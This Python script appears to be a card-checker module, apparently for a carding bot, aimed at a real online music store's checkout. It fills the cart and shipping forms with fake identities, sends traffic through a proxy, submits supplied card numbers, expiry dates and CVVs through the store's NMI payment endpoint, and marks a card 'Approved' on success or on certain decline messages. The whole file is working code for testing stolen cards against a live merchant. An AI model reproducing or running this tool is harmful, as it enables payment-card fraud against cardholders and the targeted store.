import aiohttp, uuid, traceback
from plugins.tools.address import fakexy
from faker import Faker
fake = Faker()
address_info = fakexy('us')


async def nmi1(cc, mes, ano, cvv, proxyg):
    session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False))
    email = str(uuid.uuid4())[:8] + "@gmail.com"

    try:
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-419,es;q=0.6',
            'priority': 'u=0, i',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        }

        async with session.get(
            'https://www.majestymusic.com/printed-choral-music-companion-materials/a-new-song-choral-octavo.html', 
            headers=headers, 
            proxy=proxyg
        ) as response:
            r1 = await response.text()

        with open("B3.html", "w", encoding="utf-8") as f:
            f.write(r1)

        form_key = r1.split('name="form_key" type="hidden" value="')[1].split('"')[0]

        cookies = {'form_key': form_key}

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-419,es;q=0.6',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarydHAwRTSFjv0Uvh0r',
            'origin': 'https://www.majestymusic.com',
            'priority': 'u=1, i',
            'referer': 'https://www.majestymusic.com/printed-choral-music-companion-materials/a-new-song-choral-octavo.html',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = f'------WebKitFormBoundarydHAwRTSFjv0Uvh0r\r\nContent-Disposition: form-data; name="product"\r\n\r\n6207\r\n------WebKitFormBoundarydHAwRTSFjv0Uvh0r\r\nContent-Disposition: form-data; name="selected_configurable_option"\r\n\r\n\r\n------WebKitFormBoundarydHAwRTSFjv0Uvh0r\r\nContent-Disposition: form-data; name="related_product"\r\n\r\n\r\n------WebKitFormBoundarydHAwRTSFjv0Uvh0r\r\nContent-Disposition: form-data; name="item"\r\n\r\n6207\r\n------WebKitFormBoundarydHAwRTSFjv0Uvh0r\r\nContent-Disposition: form-data; name="form_key"\r\n\r\n{form_key}\r\n------WebKitFormBoundarydHAwRTSFjv0Uvh0r--\r\n'

        async with session.post(
            'https://www.majestymusic.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cubWFqZXN0eW11c2ljLmNvbS9wcmludGVkLWNob3JhbC1tdXNpYy1jb21wYW5pb24tbWF0ZXJpYWxzL2EtbmV3LXNvbmctY2hvcmFsLW9jdGF2by5odG1s/product/6207/', 
            cookies=cookies, 
            headers=headers, 
            data=data, 
            proxy=proxyg
        ) as response:
            r2 = await response.text()

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-419,es;q=0.6',
            'priority': 'u=0, i',
            'referer': 'https://www.majestymusic.com/printed-choral-music-companion-materials/a-new-song-choral-octavo.html',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        }

        async with session.get(
            'https://www.majestymusic.com/checkout/', 
            cookies=cookies, 
            headers=headers, 
            proxy=proxyg
        ) as response:
            r3 = await response.text()

        entity_id = r3.split('"entity_id":"')[1].split('"')[0]

        headers = {
            'accept': '*/*',
            'accept-language': 'es-419,es;q=0.6',
            'origin': 'https://www.majestymusic.com',
            'priority': 'u=1, i',
            'referer': 'https://www.majestymusic.com/checkout/',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        json_data = {
            'addressInformation': {
                'shipping_address': {
                    'countryId': 'US',
                    'regionId': '43',
                    'regionCode': 'NY',
                    'region': 'New York',
                    'street': [
                        address_info['address'],
                        '',
                    ],
                    'company': '',
                    'telephone': address_info['phone_number'],
                    'postcode': address_info['zip_code'],
                    'city': address_info['city'],
                    'firstname': fake.last_name(),
                    'lastname': fake.first_name(),
                },
                'billing_address': {
                    'countryId': 'US',
                    'regionId': '43',
                    'regionCode': 'NY',
                    'region': 'New York',
                    'street': [
                        address_info['address'],
                        '',
                    ],
                    'company': '',
                    'telephone': address_info['phone_number'],
                    'postcode': address_info['zip_code'],
                    'city': address_info['city'],
                    'firstname': fake.last_name(),
                    'lastname': fake.first_name(),
                    'saveInAddressBook': None,
                },
                'shipping_method_code': '6',
                'shipping_carrier_code': 'usps',
                'extension_attributes': {},
            },
        }

        async with session.post(
            f'https://www.majestymusic.com/rest/default/V1/guest-carts/{entity_id}/shipping-information', 
            cookies=cookies, 
            headers=headers, 
            json=json_data, 
            proxy=proxyg
        ) as response:
            r4 = await response.text()

        one = cc[0:1]
        if one == "4":
            cc_type = "VI"
        elif one == "5":
            cc_type = "MC"
        elif one == "3":
            cc_type = "Ax"
        elif one == "6":
            cc_type = "DC"

        headers = {
            'accept': '*/*',
            'accept-language': 'es-419,es;q=0.6',
            'origin': 'https://www.majestymusic.com',
            'priority': 'u=1, i',
            'referer': 'https://www.majestymusic.com/checkout/',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        json_data = {
            'cartId': entity_id,
            'billingAddress': {
                'countryId': 'US',
                'regionId': '43',
                'regionCode': 'NY',
                'region': 'New York',
                'street': [
                    '769 New York Street',
                    '',
                ],
                'company': '',
                'telephone': '4259885369',
                'postcode': '10080',
                'city': 'Lawrence',
                'firstname': 'Juan',
                'lastname': 'Perez',
                'saveInAddressBook': None,
            },
            'paymentMethod': {
                'method': 'nmi_directpost',
                'additional_data': {
                    'cc_ss_start_month': '',
                    'cc_ss_start_year': '',
                    'cc_ss_issue': '',
                    'cc_type': cc_type,
                    'cc_exp_year': ano,
                    'cc_exp_month': str(int(mes)),
                    'cc_number': cc,
                },
            },
            'email': email,
        }

        async with session.post(
            f'https://www.majestymusic.com/rest/default/V1/guest-carts/{entity_id}/payment-information',
            cookies=cookies,
            headers=headers,
            json=json_data,
            proxy=proxyg
        ) as response:
            r6 = await response.text()

        await session.close()

        if 'true' in r6 or '"message":"' not in r6:
            mensaje = 'Charged 1$'
            status = 'Approved ✅'
        else:
            mensaje = r6.split('"message":"')[1].split('"')[0]
            
            if 'CVV2 Declined' in mensaje:
                status = 'Approved ✅'
            elif 'Not sufficient funds' in mensaje:
                status = 'Approved ✅'
            else:
                status = 'Declined ❌'

        return status, mensaje
        
    except Exception as e:
        await session.close()
        linea = str(e.__traceback__.tb_lineno)
        print("Error en la linea: " + linea + " " + str(e))
        status = "Error ⚠️"
        traceback_str = traceback.format_exc()
        mensaje = f"{e} | {traceback_str}"
        return status, mensaje
